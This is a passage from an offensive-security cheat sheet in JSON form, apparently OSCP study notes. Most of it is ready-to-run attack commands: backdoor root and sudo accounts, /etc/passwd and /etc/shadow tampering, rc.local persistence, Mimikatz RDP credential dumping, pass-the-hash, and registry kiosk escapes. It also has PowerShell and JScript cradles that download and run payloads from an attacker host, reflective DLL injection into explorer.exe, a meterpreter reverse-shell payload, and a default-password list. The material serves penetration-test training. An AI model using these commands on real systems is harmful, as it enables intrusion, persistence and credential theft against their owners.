            "lang": "bash",
            "code": "# Create sudo user\nsudo useradd -m -s /bin/bash hacker && sudo passwd hacker && sudo usermod -aG sudo hacker\n\n# Create root-equivalent user\nsudo useradd -u 0 -o -g 0 -M -s /bin/bash backdoor && sudo passwd backdoor\n\n# Create user with no password sudo\nsudo useradd -m -s /bin/bash hacker && echo \"hacker ALL=(ALL) NOPASSWD:ALL\" | sudo tee /etc/sudoers.d/hacker"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Tunneling with Chisel",
    "title": "Quick Reference",
    "tags": [
      "Lateral_Movement",
      "Linux",
      "Pivoting",
      "Tunneling",
      "Windows"
    ],
    "steps": [
      {
        "title": "Server Commands",
        "codes": [
          {
            "lang": "bash",
            "code": "# Basic reverse server\nchisel server -p 8000 --reverse\n\n# With SOCKS proxy\nchisel server -p 8000 --reverse --socks5\n\n# With authentication\nchisel server -p 8000 --reverse --auth user:pass\n\n# With keepalive\nchisel server -p 8000 --reverse --keepalive 30s"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Client Commands",
        "codes": [
          {
            "lang": "bash",
            "code": "# Forward single port\nchisel client <KaliIP>:8000 R:8080:192.168.100.50:80\n\n# Forward multiple ports\nchisel client <KaliIP>:8000 R:8080:192.168.100.50:80 R:3389:192.168.100.50:3389\n\n# SOCKS proxy\nchisel client <KaliIP>:8000 R:socks\n\n# With authentication\nchisel client <KaliIP>:8000 R:8080:192.168.100.50:80 --auth user:pass"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "ProxyChains Configuration",
        "codes": [
          {
            "lang": "bash",
            "code": "# Add to /etc/proxychains4.conf\nsocks5 127.0.0.1 1080\n\n# Use with tools\nproxychains <command>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Writable etc-passwd",
    "title": "Quick Reference",
    "tags": [],
    "steps": [
      {
        "title": "One-Liner Root User",
        "codes": [
          {
            "lang": "bash",
            "code": "echo 'hacker:$(openssl passwd -1 password):0:0:root:/root:/bin/bash' >> /etc/passwd && su hacker"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Check and Exploit",
        "codes": [
          {
            "lang": "bash",
            "code": "# Check\nls -l /etc/passwd\n\n# Generate hash\nopenssl passwd password\n\n# Add user\necho 'hacker:$1$xyz$hash:0:0:root:/root:/bin/bash' >> /etc/passwd\n\n# Switch\nsu hacker"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Cleanup",
        "codes": [
          {
            "lang": "bash",
            "code": "# Remove added user\nsed -i '/^hacker:/d' /etc/passwd"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Security Headers Scanning",
    "title": "Quick Scan Script",
    "tags": [
      "Reconnaissance",
      "Security_Headers",
      "Web_Application"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "text",
        "content": "```bash\n#!/bin/bash\n# security-headers-scan.sh"
      },
      {
        "type": "text",
        "content": "URL=$1"
      },
      {
        "type": "text",
        "content": "echo \"=== Security Headers Scan for $URL ===\"\necho \"\""
      },
      {
        "type": "text",
        "content": "HEADERS=(\n\"Content-Security-Policy\"\n\"X-Frame-Options\"\n\"Strict-Transport-Security\"\n\"X-Content-Type-Options\"\n\"X-XSS-Protection\"\n\"Referrer-Policy\"\n\"Permissions-Policy\"\n)"
      },
      {
        "type": "text",
        "content": "for header in \"${HEADERS[@]}\"; do\nvalue=$(curl -s -I \"$URL\" | grep -i \"^$header:\" | cut -d' ' -f2-)\nif [ -z \"$value\" ]; then\necho \"[MISSING] $header\"\nelse\necho \"[FOUND] $header: $value\"\nfi\ndone"
      },
      {
        "type": "text",
        "content": "echo \"\"\necho \"=== Information Disclosure Headers ===\"\ncurl -s -I \"$URL\" | grep -iE \"^(Server|X-Powered-By|X-AspNet-Version|X-Generator):\"\n```"
      },
      {
        "type": "text",
        "content": "**Usage:**\n```bash\nchmod +x security-headers-scan.sh\n./security-headers-scan.sh https://example.com\n```"
      }
    ]
  },
  {
    "category": "TTY Shell Stabilization",
    "title": "Quick Stabilization (One-Liner)",
    "tags": [],
    "steps": [
      {
        "title": "Python Method",
        "codes": [
          {
            "lang": "bash",
            "code": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' && export TERM=xterm"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Then manually do:",
        "codes": [
          {
            "lang": "bash",
            "code": "# Ctrl+Z\nstty raw -echo; fg\n# Enter twice\nreset"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Linux Persistence",
    "title": "rc.local Persistence",
    "tags": [
      "Linux",
      "Persistence"
    ],
    "steps": [
      {
        "title": "Add Command to rc.local",
        "codes": [
          {
            "lang": "bash",
            "code": "# Edit rc.local directly\nnano /etc/rc.local"
          },
          {
            "lang": "bash",
            "code": "# Or append command to rc.local\necho \"<FullPathToScript>\" >> /etc/rc.local"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "The full path to the script or binary will be executed on system startup."
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "HackTricks - Linux Persistence",
        "url": "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Execute commands on system startup via rc.local."
      }
    ]
  },
  {
    "category": "NetExec",
    "title": "RDP Access Testing",
    "tags": [
      "Active_Directory",
      "Discovery",
      "Enumeration",
      "NetExec",
      "Windows"
    ],
    "steps": [
      {
        "title": "Test RDP Access",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc rdp <TargetIP> -u <Username> -p '<Password>'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Test RDP on Multiple Targets",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc rdp 192.168.1.0/24 -u <Username> -p '<Password>'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "RDP Attacks",
    "title": "RDP as Console",
    "tags": [
      "Lateral_Movement",
      "RDP",
      "Windows"
    ],
    "steps": [
      {
        "title": "SharpRDP - Execute Commands via RDP",
        "codes": [
          {
            "lang": "bash",
            "code": "SharpRDP.exe computername=<Target> command=\"cmd.exe /c whoami\" username=<User> password=<Password>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "SharpRDP with Pass-the-Hash",
        "codes": [
          {
            "lang": "bash",
            "code": "SharpRDP.exe computername=<Target> command=\"powershell -c IEX(...)\" username=<User> ntlmhash=<NTHash>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "RDP Attacks",
    "title": "RDP Attacks",
    "tags": [
      "Lateral_Movement",
      "RDP",
      "Windows"
    ],
    "steps": [
      {
        "title": "Standard RDP Connection",
        "codes": [
          {
            "lang": "bash",
            "code": "xfreerdp /u:<User> /p:<Password> /v:<Target>"
          },
          {
            "lang": "bash",
            "code": "rdesktop -u <User> -p <Password> <Target>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "RDP with Pass-the-Hash",
        "codes": [
          {
            "lang": "bash",
            "code": "xfreerdp /u:<User> /pth:<NTHash> /v:<Target>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true,
        "notes": [
          {
            "type": "note",
            "content": "Requires Restricted Admin mode enabled on target.",
            "variant": "warning"
          }
        ]
      },
      {
        "title": "Enable Restricted Admin (Target)",
        "codes": [
          {
            "lang": "bash",
            "code": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Check RDP Access",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc rdp <Target> -u <User> -p <Password>\nnxc rdp <Target> -u <User> -H <NTHash>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      }
    ],
    "resources": [
      {
        "text": "MITRE - Remote Desktop Protocol",
        "url": "https://attack.mitre.org/techniques/T1021/001/"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "RDP allows full GUI access. Good for pivoting, credential theft, and maintaining presence.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Mimikatz",
    "title": "RDP Credential Theft",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Mimikatz",
      "Windows"
    ],
    "steps": [
      {
        "title": "Dump RDP Credentials",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # privilege::debug\nmimikatz # ts::mstsc"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Extracts credentials from mstsc.exe (Remote Desktop Client).",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Dump Terminal Services Sessions",
        "codes": [
          {
            "lang": "bash",
            "code": "mimikatz # ts::sessions"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "Security Headers Scanning",
    "title": "Reconnaissance Value",
    "tags": [
      "Reconnaissance",
      "Security_Headers",
      "Web_Application"
    ],
    "steps": [
      {
        "title": "Information Disclosure",
        "substeps": [
          {
            "title": "Server Header",
            "codes": [
              {
                "lang": "text",
                "code": "Server: Apache/2.4.41 (Ubuntu)"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "postNotes": [
              {
                "type": "note",
                "content": "Reveals web server version - search for CVEs.",
                "variant": "tip"
              }
            ]
          },
          {
            "title": "X-Powered-By Header",
            "codes": [
              {
                "lang": "text",
                "code": "X-Powered-By: PHP/7.4.3"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "postNotes": [
              {
                "type": "note",
                "content": "Reveals backend technology and version.",
                "variant": "tip"
              }
            ]
          },
          {
            "title": "X-AspNet-Version",
            "codes": [
              {
                "lang": "text",
                "code": "X-AspNet-Version: 4.0.30319"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "postNotes": [
              {
                "type": "note",
                "content": "Reveals .NET framework version.",
                "variant": "tip"
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Technology Stack Detection",
        "codes": [
          {
            "lang": "bash",
            "code": "# Check all headers for technology indicators\ncurl -I https://example.com | grep -E \"(Server|X-Powered-By|X-AspNet|X-Generator)\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "GitHub Reconnaissance",
    "title": "Recovering Deleted Commits",
    "tags": [],
    "steps": [
      {
        "title": "View Reflog",
        "codes": [
          {
            "lang": "bash",
            "code": "git reflog"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Restore Deleted Commit",
        "codes": [
          {
            "lang": "bash",
            "code": "git checkout <commit-id>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Create Branch from Deleted Commit",
        "codes": [
          {
            "lang": "bash",
            "code": "git branch recovered-branch <commit-id>\ngit checkout recovered-branch"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Reflective PowerShell Loading",
    "title": "Reflective Assembly Loading",
    "tags": [
      "Defense_Evasion",
      "Execution",
      "PowerShell",
      "Python",
      "Reflective_Loading",
      "Windows"
    ],
    "steps": [
      {
        "title": "PowerShell Assembly Loading",
        "substeps": [
          {
            "title": "Load Assembly from Byte Array",
            "codes": [
              {
                "lang": "powershell",
                "code": "$bytes = [System.IO.File]::ReadAllBytes(\"C:\\path\\to\\assembly.dll\")\n$assembly = [System.Reflection.Assembly]::Load($bytes)"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Load Assembly from Base64",
            "codes": [
              {
                "lang": "powershell",
                "code": "$base64 = \"<Base64EncodedAssembly>\"\n$bytes = [Convert]::FromBase64String($base64)\n$assembly = [System.Reflection.Assembly]::Load($bytes)"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Download and Load Assembly",
            "codes": [
              {
                "lang": "powershell",
                "code": "$wc = New-Object System.Net.WebClient\n$bytes = $wc.DownloadData(\"http://<AttackerIP>/assembly.dll\")\n$assembly = [System.Reflection.Assembly]::Load($bytes)"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Invoke Loaded Assembly",
        "substeps": [
          {
            "title": "Get Entry Point and Invoke",
            "codes": [
              {
                "lang": "powershell",
                "code": "$assembly = [System.Reflection.Assembly]::Load($bytes)\n$entryPoint = $assembly.EntryPoint\n$entryPoint.Invoke($null, (, [string[]]@()))"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Invoke Specific Method",
            "codes": [
              {
                "lang": "powershell",
                "code": "$assembly = [System.Reflection.Assembly]::Load($bytes)\n$type = $assembly.GetType(\"Namespace.ClassName\")\n$method = $type.GetMethod(\"MethodName\")\n$method.Invoke($null, @(\"arg1\", \"arg2\"))"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "JScript Reflective Loading",
        "substeps": [
          {
            "title": "Load PowerShell from JScript",
            "codes": [
              {
                "lang": "javascript",
                "code": "var shell = new ActiveXObject(\"WScript.Shell\");\nvar ps = \"powershell -exec bypass -nop -w hidden -c \\\"\";\nps += \"$bytes=[Convert]::FromBase64String('<Base64Assembly>');\";\nps += \"$assembly=[System.Reflection.Assembly]::Load($bytes);\";\nps += \"$assembly.EntryPoint.Invoke($null,(,[string[]]@()))\\\"\";\nshell.Run(ps, 0, false);"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Cradle for Remote Assembly Loading",
        "substeps": [
          {
            "title": "Complete Download and Execute Cradle",
            "codes": [
              {
                "lang": "powershell",
                "code": "$wc = New-Object System.Net.WebClient\n$wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()\n$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials\n$bytes = $wc.DownloadData(\"http://<AttackerIP>/payload.dll\")\n$assembly = [System.Reflection.Assembly]::Load($bytes)\n$assembly.EntryPoint.Invoke($null, (, [string[]]@()))"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "One-Liner Version",
            "codes": [
              {
                "lang": "powershell",
                "code": "IEX([System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://<AttackerIP>/payload.dll')).EntryPoint.Invoke($null,(,[string[]]@())))"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Encoding Assembly for Transport",
        "substeps": [
          {
            "title": "Base64 Encode Assembly",
            "codes": [
              {
                "lang": "powershell",
                "code": "$bytes = [System.IO.File]::ReadAllBytes(\"payload.dll\")\n$base64 = [Convert]::ToBase64String($bytes)\n$base64 | Out-File -Encoding ASCII payload_b64.txt"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Compress and Encode",
            "codes": [
              {
                "lang": "powershell",
                "code": "$bytes = [System.IO.File]::ReadAllBytes(\"payload.dll\")\n$ms = New-Object System.IO.MemoryStream\n$gs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Compress)\n$gs.Write($bytes, 0, $bytes.Length)\n$gs.Close()\n$compressed = $ms.ToArray()\n$base64 = [Convert]::ToBase64String($compressed)"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Decompress at Runtime",
            "codes": [
              {
                "lang": "powershell",
                "code": "$compressed = [Convert]::FromBase64String(\"<Base64CompressedAssembly>\")\n$ms = New-Object System.IO.MemoryStream(, $compressed)\n$gs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress)\n$outMs = New-Object System.IO.MemoryStream\n$gs.CopyTo($outMs)\n$bytes = $outMs.ToArray()\n$assembly = [System.Reflection.Assembly]::Load($bytes)"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      }
    ],
    "resources": [
      {
        "text": "Microsoft Assembly.Load",
        "url": "https://learn.microsoft.com/en-us/dotnet/api/system.reflection.assembly.load"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Load .NET assemblies directly into memory without touching disk. Combine with JScript for fileless execution.",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "Reflective DLL Injection",
    "title": "Reflective DLL Injection",
    "tags": [
      "Code_Injection",
      "DLL_Injection",
      "Defense_Evasion",
      "Reflective_Loading",
      "Windows"
    ],
    "steps": [
      {
        "title": "Theory",
        "substeps": [
          {
            "title": "Key Differences from Standard DLL Injection",
            "codes": [],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "- **Standard** - Uses LoadLibrary, DLL must exist on disk, easy to detect\n- **Reflective** - DLL contains custom loader, can load from memory, no disk write required"
              }
            ]
          },
          {
            "title": "Reflective Injection Flow",
            "codes": [],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Injection sequence:\n1. Allocate memory in target process\n2. Write entire DLL (not just path) to allocated memory\n3. Calculate offset to reflective loader function in DLL\n4. Create remote thread pointing to reflective loader\n5. Reflective loader manually maps DLL, resolves imports, calls DllMain",
                "variant": "tip"
              }
            ]
          },
          {
            "title": "Required Components",
            "codes": [],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Key components:\n- **Reflective Loader** - Function in DLL that performs manual mapping\n- **Position Independent Code** - Loader must work regardless of load address\n- **Import Resolution** - Manually resolve GetProcAddress, LoadLibrary, etc.",
                "variant": "important"
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "PowerShell Injection",
        "substeps": [
          {
            "title": "Using Invoke-ReflectivePEInjection",
            "codes": [
              {
                "lang": "powershell",
                "code": "# Load module\nIEX(New-Object Net.WebClient).DownloadString('http://<AttackerIP>/Invoke-ReflectivePEInjection.ps1')"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "**PowerSploit** module for reflective injection.",
                "variant": "tip"
              }
            ]
          },
          {
            "title": "Inject DLL into Remote Process",
            "codes": [
              {
                "lang": "powershell",
                "code": "# Read DLL bytes\n$bytes = [System.IO.File]::ReadAllBytes(\"C:\\path\\to\\reflective.dll\")\n\n# Inject into explorer.exe\n$proc = Get-Process explorer\nInvoke-ReflectivePEInjection -PEBytes $bytes -ProcId $proc.Id"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Inject DLL into Current Process",
            "codes": [
              {
                "lang": "powershell",
                "code": "$bytes = [System.IO.File]::ReadAllBytes(\"C:\\path\\to\\reflective.dll\")\nInvoke-ReflectivePEInjection -PEBytes $bytes"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Inject EXE into Memory",
            "codes": [
              {
                "lang": "powershell",
                "code": "$bytes = [System.IO.File]::ReadAllBytes(\"C:\\path\\to\\payload.exe\")\nInvoke-ReflectivePEInjection -PEBytes $bytes -ExeArgs \"arg1 arg2\""
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Download and Inject",
            "codes": [
              {
                "lang": "powershell",
                "code": "$wc = New-Object Net.WebClient\n$bytes = $wc.DownloadData(\"http://<AttackerIP>/reflective.dll\")\n$proc = Get-Process explorer\nInvoke-ReflectivePEInjection -PEBytes $bytes -ProcId $proc.Id"
              }
            ],
            "optional": false,
            "alternative": true,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Generate Reflective DLL",
        "substeps": [
          {
            "title": "msfvenom Reflective DLL",
            "codes": [
              {
                "lang": "bash",
                "code": "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<AttackerIP> LPORT=<Port> -f dll_reflect -o reflective.dll"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Compile Custom Reflective DLL",
            "codes": [
              {
                "lang": "bash",
                "code": "# Clone framework\ngit clone https://github.com/stephenfewer/ReflectiveDLLInjection\n\n# Add payload to dll/src/ReflectiveDll.c\n# Compile with Visual Studio"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false,
            "notes": [
              {
                "type": "note",
                "content": "Use **ReflectiveDLLInjection** project template with custom payload.",
                "variant": "tip"
              }
            ]
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      }
    ],
    "resources": [
      {
        "text": "Reflective DLL Injection - Stephen Fewer",
        "url": "https://github.com/stephenfewer/ReflectiveDLLInjection"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "DLL loads itself into memory without using **LoadLibrary**. Avoids disk writes and standard DLL loading APIs. DLL contains its own loader.",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "Windows Kiosk Breakout",
    "title": "Registry Escapes",
    "tags": [
      "Defense_Evasion",
      "Mobile",
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "If regedit Accessible",
        "codes": [
          {
            "lang": "text",
            "code": "# Navigate to\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\n\n# Create key for on-screen keyboard\nosk.exe\\Debugger = \"cmd.exe\"\n\n# Trigger on-screen keyboard for shell"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Writable etc-passwd",
    "title": "Related Techniques",
    "tags": [],
    "steps": [
      {
        "title": "/etc/shadow Writable",
        "codes": [
          {
            "lang": "bash",
            "code": "# If /etc/shadow is writable instead\n# Generate hash\nopenssl passwd -6 Password123\n\n# Add to /etc/shadow\necho 'hacker:$6$salt$hash:18000:0:99999:7:::' >> /etc/shadow\n\n# Add to /etc/passwd (without password)\necho 'hacker:x:0:0:root:/root:/bin/bash' >> /etc/passwd\n\n# Switch user\nsu hacker"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "/etc/group Writable",
        "codes": [
          {
            "lang": "bash",
            "code": "# Add yourself to sudo/wheel group\necho 'sudo:x:27:hacker' >> /etc/group\n\n# Or modify existing line\nsed -i 's/^sudo:x:27:/sudo:x:27:hacker,/' /etc/group"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "OSCP Exam Strategy",
    "title": "Remember",
    "tags": [
      "Exam",
      "OSCP",
      "Workflow"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "text",
        "content": "**OSCP is a marathon, not a sprint:**\n- Pace yourself\n- Stay methodical\n- Trust your training\n- Don't give up"
      },
      {
        "type": "text",
        "content": "**You only need 70 points to pass:**\n- 3 machines + bonus = 70 points\n- You don't need to root everything\n- Partial credit is possible"
      },
      {
        "type": "text",
        "content": "**The exam tests methodology:**\n- Enumeration\n- Exploitation\n- Privilege escalation\n- Documentation"
      },
      {
        "type": "note",
        "content": "Try Harder, but also Try Smarter. Good luck!",
        "variant": "important"
      }
    ]
  },
  {
    "category": "Default Credentials",
    "title": "Remote Access Defaults",
    "tags": [],
    "steps": [
      {
        "title": "SSH",
        "codes": [
          {
            "lang": "plaintext",
            "code": "root:root\nadmin:admin\nuser:user\npi:raspberry"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "RDP",
        "codes": [
          {
            "lang": "plaintext",
            "code": "Administrator:password\nAdministrator:Password1\nadmin:admin"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "VNC",
        "codes": [
          {
            "lang": "plaintext",
            "code": "(blank):password\nadmin:admin"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Telnet",
        "codes": [
          {
            "lang": "plaintext",
            "code": "admin:admin\nroot:root\nadmin:(blank)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "SSH Pivoting",
    "title": "Remote Port Forwarding",
    "tags": [],
    "steps": [
      {
        "title": "Forward Local Port to Remote",
        "codes": [
          {
            "lang": "bash",
            "code": "ssh <Username>@<TargetIP> -R <RemotePort>:localhost:<LocalPort>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Example: Expose Local Web Server",
        "codes": [
          {
            "lang": "bash",
            "code": "ssh user@10.10.10.5 -R 8080:localhost:80"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "The remote machine can now access your local web server on port 80 by connecting to its own port 8080.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Reverse Shell Catcher",
        "codes": [
          {
            "lang": "bash",
            "code": "# On attacker machine\nnc -lvnp 4444\n\n# SSH reverse tunnel\nssh user@10.10.10.5 -R 4444:localhost:4444"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Useful when the target can't directly connect back to you but you have SSH access.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": []
  },
  {
    "category": "Security Headers Scanning",
    "title": "Reporting Findings",
    "tags": [
      "Reconnaissance",
      "Security_Headers",
      "Web_Application"
    ],
    "steps": [
      {
        "title": "Low Severity",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "- Missing `Referrer-Policy`\n- Missing `Permissions-Policy`\n- Short HSTS `max-age`"
          }
        ]
      },
      {
        "title": "Medium Severity",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "- Missing `X-Content-Type-Options`\n- Missing `X-XSS-Protection`\n- Weak CSP configuration"
          }
        ]
      },
      {
        "title": "High Severity",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "- Missing `Content-Security-Policy` (if XSS is possible)\n- Missing `X-Frame-Options` (if clickjacking is possible)\n- Missing `Strict-Transport-Security` on sensitive sites"
          }
        ]
      },
      {
        "title": "Information Disclosure",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "- `Server` header reveals version\n- `X-Powered-By` reveals backend technology\n- `X-AspNet-Version` reveals framework version"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Password Cracking",
    "title": "Required Software",
    "tags": [
      "Credential_Access",
      "Hashcat",
      "Password_Attack"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Install the following tools on your cracking rig:\n- **Hashcat v5.1+**: [https://hashcat.net/hashcat/](https://hashcat.net/hashcat/)\n- **John the Ripper (Jumbo)**: [http://www.openwall.com/john/](http://www.openwall.com/john/)\n- **PACK (Password Analysis & Cracking Toolkit)**: [http://thesprawl.org/projects/pack/](http://thesprawl.org/projects/pack/)\n- **Hashcat-utils**: [https://github.com/hashcat/hashcat-utils](https://github.com/hashcat/hashcat-utils)",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Resource-Based Constrained Delegation",
    "title": "Resource-Based Constrained Delegation Theory",
    "tags": [
      "Active_Directory",
      "Delegation_Abuse",
      "Impacket",
      "Kerberos",
      "Lateral_Movement",
      "Privilege_Escalation",
      "Rubeus",
      "Windows"
    ],
    "steps": [
      {
        "title": "RBCD vs Traditional Constrained Delegation",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "- **Traditional** - Source account lists which SPNs it can delegate TO\n- **RBCD** - Target resource lists which accounts can delegate TO IT"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "HackTricks - RBCD",
